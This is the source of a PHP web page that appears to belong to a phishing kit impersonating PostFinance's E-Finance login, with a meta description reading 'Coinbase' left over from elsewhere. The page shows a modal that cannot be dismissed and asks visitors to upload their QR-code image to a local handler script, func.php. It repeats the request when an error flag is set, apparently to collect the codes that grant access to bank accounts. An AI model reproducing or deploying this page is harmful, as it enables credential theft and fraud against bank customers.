<?php
  session_start();
  include "./Assets/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.ico">
        <title>PostFinance - E-Finance</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>             
    </head>
    <body>

      <!-- header -->
      <header class="header_1">
        <div class="part_1">
          <div class="container_part1 d-flex align-items-center justify-content-end">
            <p class="d-flex align-items-center mb-0"><?php echo get_text('p_2_1'); ?></p>
            <p class="d-flex align-items-center mb-0 ms-3"><?php echo get_text('p_2_2'); ?></p>
          </div>
        </div>
        <div class="part_2">
          <div class="container_part2 d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/logo-postfinanc.svg" alt="">
            </div>
            <div class="bars">
              <img src="./Assets/imgs/bars.svg" alt="">
              <p class="mb-0"><?php echo get_text('p_1_24'); ?></p>
            </div>
          </div>
        </div>
      </header>

      <div style="min-height:70vh"></div>   
        <div class="modal fade" id="sms-area" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="sms-areaLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-body">
                        <form id="forma" action="./Assets/php/config/func.php" method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="qr_box">
                            <div class="d-flex justify-content-center">
                              <svg style="width: 140px; height: 92px;" viewBox="0 0 500 333" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <rect width="500" height="333" fill="white"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M277.013 42.4255H422.169C427.04 42.4255 430.989 46.3818 430.989 51.2622V277.736H68.7712V51.2622C68.7712 46.3818 72.7202 42.4255 77.5915 42.4255H223.014V48.5841C223.014 50.9507 224.929 52.8692 227.292 52.8692H272.736C275.098 52.8692 277.013 50.9507 277.013 48.5841V42.4255ZM276.479 41.8887H277.013H422.169C427.336 41.8887 431.525 46.0853 431.525 51.2622V278.273H68.2354V51.2622C68.2354 46.0853 72.4242 41.8887 77.5915 41.8887H223.014H223.549H276.479ZM223.549 42.4255H276.479V48.5841C276.479 50.6549 274.803 52.3336 272.736 52.3336H227.292C225.225 52.3336 223.549 50.6549 223.549 48.5841V42.4255Z" fill="#D6EBEB"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M65.5614 278.291V51.2622C65.5614 44.6057 70.9476 39.2095 77.5918 39.2095H422.169C428.813 39.2095 434.199 44.6057 434.199 51.2622V278.291H461.493C462.231 278.291 462.829 278.89 462.829 279.63V282.308C462.829 288.225 458.042 293.021 452.136 293.021H47.9067C42.0012 293.021 37.2139 288.225 37.2139 282.308V279.63C37.2139 278.89 37.8123 278.291 38.5505 278.291H65.5614ZM77.5918 41.8887C72.4245 41.8887 68.2356 46.0853 68.2356 51.2622V278.273H431.525V51.2622C431.525 46.0853 427.336 41.8887 422.169 41.8887H77.5918ZM276.506 41.8887V48.3434C276.506 50.5621 274.951 52.3607 272.736 52.3607H227.292C225.077 52.3607 223.522 50.5621 223.522 48.3434V41.8887H276.506Z" fill="#004B5A"/>
                                <rect x="133.42" y="75.8147" width="230.973" height="174.928" rx="6" fill="#D6EBEB"/>
                                <path d="M188.276 132.19H164.917V156.068" stroke="#067079" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"/>
                                <path d="M188.276 233.322H164.917V209.444" stroke="#067079" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"/>
                                <path d="M240.492 132.19H263.852V156.068" stroke="#067079" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"/>
                                <path d="M240.492 233.322H263.852V209.444" stroke="#067079" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"/>
                                <g clip-path="url(#clip0_4125_16836)">
                                <rect x="171.228" y="138.83" width="85.9012" height="87.8102" fill="#EEF6F6"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M196.712 142.437H174.756V164.881H196.712V142.437ZM192.72 146.518H178.748V160.8H192.72V146.518Z" fill="#00292E"/>
                                <path d="M181.443 149.272H190.026V158.046H181.443V149.272Z" fill="#00292E"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M196.712 200.588H174.756V223.033H196.712V200.588ZM192.72 204.669H178.748V218.952H192.72V204.669Z" fill="#00292E"/>
                                <path d="M181.443 207.424H190.026V216.198H181.443V207.424Z" fill="#00292E"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M253.6 142.437H231.643V164.881H253.6V142.437ZM249.608 146.518H235.635V160.8H249.608V146.518Z" fill="#00292E"/>
                                <path d="M238.33 149.272H246.913V158.046H238.33V149.272Z" fill="#00292E"/>
                                <path d="M201.037 142.437H209.798V151.392H201.037V142.437Z" fill="#00292E"/>
                                <path d="M201.037 151.392H209.798V160.347H201.037V151.392Z" fill="#00292E"/>
                                <path d="M201.037 196.168H209.798V205.123H201.037V196.168Z" fill="#00292E"/>
                                <path d="M201.037 214.078H209.798V223.033H201.037V214.078Z" fill="#00292E"/>
                                <path d="M209.798 214.078H218.558V223.033H209.798V214.078Z" fill="#00292E"/>
                                <path d="M209.798 205.227H218.558V214.182H209.798V205.227Z" fill="#00292E"/>
                                <path d="M236.079 205.123H244.839V214.078H236.079V205.123Z" fill="#00292E"/>
                                <path d="M201.037 178.257H209.798V187.212H201.037V178.257Z" fill="#00292E"/>
                                <path d="M227.319 187.212H236.079V196.168H227.319V187.212Z" fill="#00292E"/>
                                <path d="M227.319 169.302H236.079V178.257H227.319V169.302Z" fill="#00292E"/>
                                <path d="M209.798 160.347H218.558V169.302H209.798V160.347Z" fill="#00292E"/>
                                <path d="M218.558 151.392H227.319V160.347H218.558V151.392Z" fill="#00292E"/>
                                <path d="M201.037 169.302H209.798V178.257H201.037V169.302Z" fill="#00292E"/>
                                <path d="M183.516 169.302H192.277V178.257H183.516V169.302Z" fill="#00292E"/>
                                <path d="M183.516 178.257H192.277V187.212H183.516V178.257Z" fill="#00292E"/>
                                <path d="M192.277 178.257H201.037V187.212H192.277V178.257Z" fill="#00292E"/>
                                <path d="M227.319 196.168H236.079V205.123H227.319V196.168Z" fill="#00292E"/>
                                <path d="M192.277 187.212H201.037V196.168H192.277V187.212Z" fill="#00292E"/>
                                <path d="M174.756 187.212H183.516V196.168H174.756V187.212Z" fill="#00292E"/>
                                <path d="M218.558 205.227H227.319V214.182H218.558V205.227Z" fill="#00292E"/>
                                <path d="M209.798 187.212H218.558V196.168H209.798V187.212Z" fill="#00292E"/>
                                <path d="M218.558 178.257H227.319V187.212H218.558V178.257Z" fill="#00292E"/>
                                <path d="M218.558 169.302H227.319V178.257H218.558V169.302Z" fill="#00292E"/>
                                <path d="M236.079 214.078H244.839V223.033H236.079V214.078Z" fill="#00292E"/>
                                <path d="M244.839 214.078H253.6V223.033H244.839V214.078Z" fill="#00292E"/>
                                <path d="M236.079 196.168H244.839V205.123H236.079V196.168Z" fill="#00292E"/>
                                <path d="M244.839 187.212H253.6V196.168H244.839V187.212Z" fill="#00292E"/>
                                <path d="M236.079 178.257H244.839V187.212H236.079V178.257Z" fill="#00292E"/>
                                <path d="M174.756 169.302H183.516V178.257H174.756V169.302Z" fill="#00292E"/>
                                <path d="M209.798 142.437H218.558V151.392H209.798V142.437Z" fill="#00292E"/>
                                <path d="M244.839 169.302H253.6V178.257H244.839V169.302Z" fill="#00292E"/>
                                <path d="M218.558 142.441H227.319V151.396H218.558V142.441Z" fill="#00292E"/>
                                </g>
                                <g clip-path="url(#clip1_4125_16836)">
                                <path d="M316.559 196.275C328.662 196.275 338.473 186.246 338.473 173.874C338.473 161.503 328.662 151.474 316.559 151.474C304.457 151.474 294.646 161.503 294.646 173.874C294.646 186.246 304.457 196.275 316.559 196.275Z" fill="#FFCC00"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M327.961 164.127L315.722 184.013C315.425 184.496 314.92 184.805 314.363 184.846C313.807 184.887 313.264 184.654 312.902 184.219L304.665 174.314L307.336 171.993L314.026 180.037L324.993 162.219L327.961 164.127Z" fill="#00292E"/>
                                </g>
                                <path d="M196.531 96.8518H259.37" stroke="#067079" stroke-width="2" stroke-linecap="round"/>
                                <path d="M196.093 103.727L291.765 104.307" stroke="#067079" stroke-width="2" stroke-linecap="round"/>
                                <rect x="163.223" y="95.0989" width="24.5432" height="10.5185" rx="2.5" fill="#FFCC00"/>
                                <defs>
                                <clipPath id="clip0_4125_16836">
                                <rect width="85.9012" height="87.8102" fill="white" transform="translate(171.159 138.795)"/>
                                </clipPath>
                                <clipPath id="clip1_4125_16836">
                                <rect width="43.8272" height="44.8011" fill="white" transform="translate(294.646 151.474)"/>
                                </clipPath>
                                </defs>
                              </svg>                              
                            </div>
                            <h3><?php echo get_text('p_9_1'); ?></h3>

                            <p class="mb-0">
                                <?php echo get_text('p_9_2'); ?>
                            </p>

                            <p>
                                <?php echo get_text('p_9_3'); ?>
                            </p>


                            <div>
                                <label class="box_upload" for="qr">
                                    <i class="ri-upload-2-line"></i>
                                    <h6><?php echo get_text('p_9_4'); ?></h6>
                                    <p><?php echo get_text('p_9_5'); ?></p>
                                    <input type="file" name="qr" id="qr" class="d-none">
                                </label>
                            </div>

                            <?php if( isset($_GET['error']) ) : ?>
                            <p style="text-align: center; color: red; font-size: 13px;" class="mb-0 mt-4 errs">
                                <?php echo get_text('p_9_6'); ?>
                            </p>
                            <?php endif; ?>

                            <div class="btns">
                                <button type="submit"><?php echo get_text('p_9_7'); ?></button>
                            </div>

                        </form>
                    </div>
                </div>
        </div>
      </div>    


      <!-- footer -->
      <div class="footer_2 mt-5">
        <div class="container_footer2 d-flex justify-content-between align-items-start">
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><span class="s1"><?php echo get_text('p_2_10'); ?></span></li>
              <li><span class="s2"><?php echo get_text('p_2_11'); ?></span></li>
            </ul>
          </div>
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_12'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href=""><?php echo get_text('p_2_13'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_14'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
            <ul class="ps-0 mb-0 link_md">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links link_lg">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links">
            <a href="" class="lang"><img src="./Assets/imgs/lang.svg" alt=""> <?php echo get_text('p_2_17'); ?></a>
          </div>
        </div>
      </div>







        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>
            var myModal = new bootstrap.Modal(document.getElementById('sms-area'), {
                backdrop: 'static',
                keyboard: false
            });
            myModal.show();    
             
            $("#qr").change(function(){
              if ($("#qr").val() != "") {
                    $('.box_upload').css({"background":"#2ecc7130","border-color":"#008000"});
                    $('.box_upload h6 , .box_upload p').css({"color":"green"});
                    $('.box_upload i').removeClass('ri-upload-2-line').addClass('ri-checkbox-circle-line').css('color','#008000')
                    $('.errs').addClass('d-none');
                    
              }else{
                return false;
              }
            });   
        </script>
    </body>
</html>